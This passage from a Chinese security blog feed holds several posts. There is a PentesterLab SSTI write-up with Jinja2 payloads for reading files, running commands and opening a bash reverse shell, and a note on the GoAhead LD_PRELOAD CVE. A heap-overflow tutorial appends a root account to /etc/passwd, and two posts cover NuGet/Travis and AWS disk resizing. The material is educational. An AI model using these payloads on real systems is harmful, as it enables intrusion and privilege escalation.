      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li><li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference中的链接。<br>这个题目和Reference文章基本是一样的。</li><li><p>读文件就不解释了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p></li><li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li><li><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""></li><li>索引233，后面就可以执行命令了，但是不能回显，这个时候可以把我们的命令执行后结果写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecommand.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">(&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><ul><li>那能不能拿到shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p><h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul><li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li><li><p>一步一步找到os.system的索引为138</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138]</span><br><span class="line">(&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul><li>本来想写个长文介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好 ;)<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="noopener">Exploring SSTI in Flask/Jinja2</a></li><li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="noopener">Exploring SSTI in Flask/Jinja2 - Part 2</a></li><li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">CSAW-CTF Python sandbox write-up</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>有关CVE-2017-17562的一些零碎点</title>
      <link href="/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
      <url>/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li><li>goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里<a href="https://embedthis.com/goahead/" target="_blank" rel="noopener">https://embedthis.com/goahead/</a><h4 id="CVE-2016-1247简单介绍"><a href="#CVE-2016-1247简单介绍" class="headerlink" title="CVE-2016-1247简单介绍"></a>CVE-2016-1247简单介绍</h4></li><li>这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。<br></li><li>具体需要的条件主要有如下：<br><br>1.GoAhead开启CGI功能，即有cgi的处理页面(关于GoAhead cgi的使用可以看向这里<a href="https://embedthis.com/goahead/doc/users/cgi.html" target="_blank" rel="noopener">https://embedthis.com/goahead/doc/users/cgi.html</a>)<br>2.需要GoAhead版本低于3.6.5<br>3.需要动态链接glibc库(默认是动态链接的)<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4></li><li>在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、GoAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/origin.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/poc.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/afterpoc.png" alt=""><br>(a.html extract from wireshark)<br>可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/proc.png" alt=""><br>可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li><li>这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件</li><li>就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。<h4 id="漏洞引申1-有关nginx提权"><a href="#漏洞引申1-有关nginx提权" class="headerlink" title="漏洞引申1-有关nginx提权"></a>漏洞引申1-有关nginx提权</h4></li><li>漏洞分析文章见这里<br><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">作者的poc shell脚本写的不错</span><br></pre></td></tr></table></figure></li></ul><p><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="noopener">Nginx权限提升漏洞(CVE-2016-1247) 分析</a></p><ul><li>之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。<h4 id="漏洞引申2-有关shellshock"><a href="#漏洞引申2-有关shellshock" class="headerlink" title="漏洞引申2-有关shellshock"></a>漏洞引申2-有关shellshock</h4></li><li>对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。<br><a href="http://www.vuln.cn/6476" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试 - Debug_Orz</a><h4 id="漏洞引申3-其它"><a href="#漏洞引申3-其它" class="headerlink" title="漏洞引申3-其它"></a>漏洞引申3-其它</h4></li><li>在github上看这个项目的一些cve issue <br><br><a href="https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed" target="_blank" rel="noopener">https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed</a><br><br>还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）<br><br>比如这个issue <a href="https://github.com/embedthis/goahead/issues/241" target="_blank" rel="noopener">https://github.com/embedthis/goahead/issues/241</a>中，某位安全研究员提的报告<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="noopener">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li><li>As I’m a fan of looking at the source    –author <br><br>向作者学习，安全研究有个好处就是我们可以透过现象看本质，研究原理很有意思。</li><li>有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待大牛们绕过的思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="noopener">REMOTE LD_PRELOAD EXPLOITATION</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>NuGet和travis实践</title>
      <link href="/2017/11/29/NuGet%E5%92%8Ctravis%E5%AE%9E%E8%B7%B5/"/>
      <url>/2017/11/29/NuGet%E5%92%8Ctravis%E5%AE%9E%E8%B7%B5/</url>
      <content type="html"><![CDATA[<h4 id="S-CR"><a href="#S-CR" class="headerlink" title="S;CR"></a>S;CR</h4><p>工作中接触到了yara，yara项目在windows上的编译是使用的vs2015，其中用到了openssl和jansson的第三方库，其中作者<a href="https://github.com/plusvic" target="_blank" rel="noopener">Victor M. Alvarez</a>用的是nuget进行三方库管理的，感觉这个解决方案还不错，可能比自己去下载源码编译lib稍微方便一点儿，所以记录一下。</p><h4 id="vs-Solution实际测试"><a href="#vs-Solution实际测试" class="headerlink" title="vs Solution实际测试"></a>vs Solution实际测试</h4><ul><li>下面就以openssl库为例进行一下测试。</li><li><p>首先需要在项目的根目录下创建一个NuGet.Config 的文件,这个应该是方便vs的NuGet进行索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;packageSources&gt;</span><br><span class="line">    &lt;add key=&quot;YARA.OpenSSL&quot;</span><br><span class="line">         value=&quot;https://ci.appveyor.com/nuget/openssl-oaib8n7lvvtp&quot; /&gt;</span><br><span class="line">    &lt;add key=&quot;YARA.Jansson&quot;</span><br><span class="line">         value=&quot;https://ci.appveyor.com/nuget/jansson-41we82mn284d&quot; /&gt;</span><br><span class="line">  &lt;/packageSources&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></li><li><p>vs的默认项目会带一个界面，可以直观的去下载，如下图。<br><img src="/2017/11/29/NuGet和travis实践/projectwithui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/ui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/out.png" alt=""><br>然后在项目中添加一下头文件的路径以及静态链接库的路径就可以使用了。<br><img src="/2017/11/29/NuGet和travis实践/1.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/2.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/3.png" alt=""></p></li><li>vs的cmake项目<br><del>vs的cmake项目稍微有些不同，就是他没有图形界面，这个时候可以使用Package Manager Console来进行查找和下载第三方库。</del><br><a href="https://docs.microsoft.com/en-us/nuget/tools/package-manager-console" target="_blank" rel="noopener">官方说明</a><br>使用Find-Package openssl 进行搜索，可以发现有很多<br><img src="/2017/11/29/NuGet和travis实践/4.png" alt=""><br>使用Install-Package YARA.OPENSSL.X64 命令进行下载<br><img src="/2017/11/29/NuGet和travis实践/5.png" alt=""><br><del>效果是一样的，都会在项目的主目录的下面创建一个packages的目录并就对应的库下载到其中。这个时候就可以通过CmakeLists.txt进行头文件以及静态链接库的包含就可以使用了</del><br>更新：<br>cmake的项目在install-package的时候会找不到default solution的问题，所以只能通过将之前下载的packages的内容复制到cmake的项目下了。<br>CMakeLists.txt的内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.8)</span><br><span class="line">include_directories(&quot;$&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/include&quot;)</span><br><span class="line"></span><br><span class="line">set(libcrypto $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libcrypto.lib)</span><br><span class="line">set(libssl $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libssl.lib)</span><br><span class="line">add_executable(Demo test.cpp)</span><br><span class="line"></span><br><span class="line">target_link_libraries(Demo $&#123;libcrypto&#125; $&#123;libssl&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>测试通过。<br>代码已上传至Github<br><a href="https://github.com/kevien/democode" target="_blank" rel="noopener">https://github.com/kevien/democode</a></p><h4 id="打包自己的package"><a href="#打包自己的package" class="headerlink" title="打包自己的package"></a>打包自己的package</h4><ul><li>yara项目中openssl库是作者自己打包到appveyor上的，那是如何上传自己打的包呢</li><li>nuget包的制作可以通过 NuGetPackageExplorer <a href="https://github.com/NuGetPackageExplorer/NuGetPackageExplorer" target="_blank" rel="noopener">link</a><br>这个工具还是挺方便的。<br><img src="/2017/11/29/NuGet和travis实践/6.png" alt=""></li><li>而且这个工具还可以进行上传，如下图所示<br><img src="/2017/11/29/NuGet和travis实践/7.png" alt=""></li><li>当然也可以直接使用nuget工具进行上传<br><img src="/2017/11/29/NuGet和travis实践/8.png" alt=""></li><li>这样我们就完成了自定义包的上传。<br><img src="/2017/11/29/NuGet和travis实践/9.png" alt=""><br>(现在的方式还是需要进行验证的，也就是需要输入appveyor的用户名和密码，public的方式暂时还没找到方法)<h4 id="利用travis进行持续化集成"><a href="#利用travis进行持续化集成" class="headerlink" title="利用travis进行持续化集成"></a>利用travis进行持续化集成</h4></li><li>首先在github创建一个token，并赋予适当的权限。可参考如下链接<br><a href="https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/" target="_blank" rel="noopener">https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/</a><br><a href="https://docs.travis-ci.com/user/github-oauth-scopes/" target="_blank" rel="noopener">https://docs.travis-ci.com/user/github-oauth-scopes/</a></li><li>然后在github的项目当中添加.travish.yml 文件，可参考<br><a href="https://docs.travis-ci.com/user/deployment/releases/" target="_blank" rel="noopener">https://docs.travis-ci.com/user/deployment/releases/</a></li><li>测试项目<br><a href="https://github.com/kevien/travisTest/" target="_blank" rel="noopener">https://github.com/kevien/travisTest/</a><br><img src="/2017/11/29/NuGet和travis实践/10.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">部署的时候有几个坑(MDZZ)，一个是file 的位置，这个会在travis的job log的展开中看到(看log、看log、看log)。</span><br><span class="line">第二个就是要在deploy项下加上键值 skip_cleanup: true</span><br></pre></td></tr></table></figure></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>用NuGet进行第三方库的操作还是比较方便的,还有就是开源项目的持续集成使用travis工具是个不错的选择。</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>一个简单的堆溢出</title>
      <link href="/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line"></span><br><span class="line">void usage(char *prog_name, char *filename) &#123;</span><br><span class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</span><br><span class="line">   exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">   int userid, fd; // file descriptor</span><br><span class="line">   char *buffer, *datafile;</span><br><span class="line"></span><br><span class="line">   buffer = (char *) malloc(100);</span><br><span class="line">   datafile = (char *) malloc(20);</span><br><span class="line">   strcpy(datafile, &quot;/var/notes&quot;);</span><br><span class="line"></span><br><span class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</span><br><span class="line">      usage(argv[0], datafile); // display usage message and exit</span><br><span class="line"></span><br><span class="line">   strcpy(buffer, argv[1]);  // copy into buffer</span><br><span class="line"></span><br><span class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</span><br><span class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</span><br><span class="line"></span><br><span class="line"> // Opening the file</span><br><span class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</span><br><span class="line">   if(fd == -1)</span><br><span class="line">      printf(&quot;in main() while opening file&quot;);</span><br><span class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</span><br><span class="line"></span><br><span class="line">   userid = getuid(); // get the real user ID</span><br><span class="line"></span><br><span class="line">// Writing data</span><br><span class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</span><br><span class="line">      printf(&quot;in main() while writing userid to file&quot;);</span><br><span class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</span><br><span class="line"></span><br><span class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</span><br><span class="line">      printf(&quot;in main() while writing buffer to file&quot;);</span><br><span class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</span><br><span class="line"></span><br><span class="line">// Closing file</span><br><span class="line">   if(close(fd) == -1)</span><br><span class="line">      printf(&quot;in main() while closing file&quot;);</span><br><span class="line"></span><br><span class="line">   printf(&quot;Note has been saved.\n&quot;);</span><br><span class="line">   free(buffer);</span><br><span class="line">   free(datafile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><ul><li>这段代码程序中有两个buffer是存放在堆上面的，这个程序会接收一个参数，并将参数最终写入到/var/notes 这个文件中。<br><img src="/2017/10/28/堆溢出利用笔记/notetaker.png" alt=""></li><li>如图所示我们可以计算出两个buffer地址之间的距离是0x70（即112个字节），我们知道第一个buffer是以null为结束的，当我们写入这个buffer长度为112个字节的时候，那么第二个buffer将会被写入到datafile这个buffer开始的部分。<br><img src="/2017/10/28/堆溢出利用笔记/nulloverflow.png" alt=""></li><li>如我们所预期的，第二个buffer被我们写入了空.那么如果被覆盖的不是null，而是其他的呢？会是什么情况<br><img src="/2017/10/28/堆溢出利用笔记/testfile.png" alt=""></li><li>这次，溢出导致第一个buffer写入到了当前文件下的testfile文件中，而不再是/var/notes 这个文件中 ，可以看到当使用free释放内存的时候报错了，这个其实就类似于栈溢出覆盖了返回地址一样。<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4></li><li>从上面可以看出，文件名可以控制，而且可以append到文件中。这里可能会有几种利用的方式，其中最常见的利用方式就是写文件/etc/passwd，这个文件包含了系统的所有的用户名、ID、登录的shell等信息(对这个文件操作之前请注意先备份O！)</li><li>这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li><li>关于密码加密我们可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</span><br><span class="line">AAhmo1jgYI0HE</span><br></pre></td></tr></table></figure></li></ul><p>所以我们最终想要在passwd文件中的条目大概是这个样子的<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</p><ul><li><p>然而，这个特殊的堆溢出并不允许我们直接这么操作，因为我们必须以/etc/passwd为结束，但是这个限制我们可以使用符号链接来”绕过”,”绕过”方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ mkdir /tmp/etc</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ln -s /bin/bash /tmp/etc/passwd</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ls -l /tmp/etc/passwd</span><br><span class="line">lrwxrwxrwx 1 xxx xxx 9 Nov 16 20:56 /tmp/etc/passwd -&gt; /bin/bash</span><br></pre></td></tr></table></figure></li><li><p>这个时候/tmp/etc/passwd指向了/bin/bash,这就意味着我们有了可登陆的shell，这个时候就变成了<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/tmp/etc/passwd</p></li><li>此外这里还需要计算一下me这里需要填充多长才能满足112个字节。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ echo &quot;myroot:AAhmo1jgYI0HE:0:0::/root:/tmp&quot; |wc -c</span><br><span class="line">37</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ bc</span><br><span class="line">bc 1.06.95</span><br><span class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</span><br><span class="line">This is free software with ABSOLUTELY NO WARRANTY.</span><br><span class="line">For details type `warranty&apos;. </span><br><span class="line">112-37+1</span><br><span class="line">76</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/28/堆溢出利用笔记/final.png" alt=""></p><ul><li>如上图所示，通过堆溢出成功添加了账号并登陆。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li><li>这里只是举例了一个发生在堆内存上的溢出漏洞，并没有涉及到像是unlink或者UAF等技巧（后面有时间再研究分享），但像是通过写/etc/passwd以及软链接的trick还是不错的。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul><li>《hacking the art of exploitation》chapter 0x340</li></ul></li><li><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="noopener">Dance In Heap（二）：一些堆利用的方法（上） </a></li><li><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">堆溢出之unlink的利用</a></li><li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="noopener">Linux堆内存管理深入分析</a></li><li><a href="https://github.com/LunaM00n/LOL-Sec-Collection/tree/master/Notes/the-heap" target="_blank" rel="noopener">The Heap</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Amazon云扩容笔记</title>
      <link href="/2017/10/22/Amazon%E4%BA%91%E6%89%A9%E5%AE%B9%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/10/22/Amazon%E4%BA%91%E6%89%A9%E5%AE%B9%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="aws扩容"><a href="#aws扩容" class="headerlink" title="aws扩容"></a>aws扩容</h2><h4 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h4><ul><li>用了亚马逊的云，但是最近8G的存储不够了。看了一下，好像有没有什么可删除的东西了。然后查了一下，原来亚马逊云是可以扩容的，暂时还不知道扩容收不收费。。为什么要记录一下呢，因为这里有一个小坑<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">按照参考1中的方法，前面几个步骤没有问题，但是最后就是报错，大概是找不到快照中的对应的目录，原来是在挂载卷的时候，目录选错了，设置成这个就可以了。/dev/sda1(见参考2).</span><br><span class="line">参考：</span><br><span class="line">1.http://naonao.blog.51cto.com/1135983/1557994</span><br><span class="line">2.https://stackoverflow.com/questions/6151695/ec2-instance-on-amazon-and-i-am-greeted-with-no-space-left-on-the-disk</span><br></pre></td></tr></table></figure></li></ul><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><ul><li>国内的文章真是坑啊，参考1的步骤是有问题的，建议还是用第二个参考链接，参考1的方法，没有先deteach掉volume就创建快照了，这种方法会导致后面启动实例失败，按照参考2的步骤来就没有问题。<br><img src="/2017/10/22/Amazon云扩容笔记/upgrade.png" alt=""><h2 id="kali-linux虚拟机扩容"><a href="#kali-linux虚拟机扩容" class="headerlink" title="kali linux虚拟机扩容"></a>kali linux虚拟机扩容</h2></li><li>参考文章<a href="https://www.rootusers.com/use-gparted-to-increase-disk-size-of-a-linux-native-partition/" target="_blank" rel="noopener">Use GParted to increase disk size of a Linux native partition</a><h2 id="ubunut虚拟机扩容"><a href="#ubunut虚拟机扩容" class="headerlink" title="ubunut虚拟机扩容"></a>ubunut虚拟机扩容</h2></li><li>坑点 要先删除swap分区，才能扩大主分区，参考文章<a 